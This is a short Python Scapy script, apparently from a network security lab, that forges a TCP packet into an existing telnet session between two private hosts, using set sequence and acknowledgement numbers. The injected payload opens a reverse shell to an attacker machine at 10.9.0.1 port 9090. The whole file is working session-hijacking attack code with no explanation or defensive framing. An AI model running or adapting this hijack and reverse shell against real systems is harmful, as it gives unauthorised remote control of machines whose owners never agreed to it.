#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=57526, dport=23, flags="A", seq=1286966920, ack=1196033821)
data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)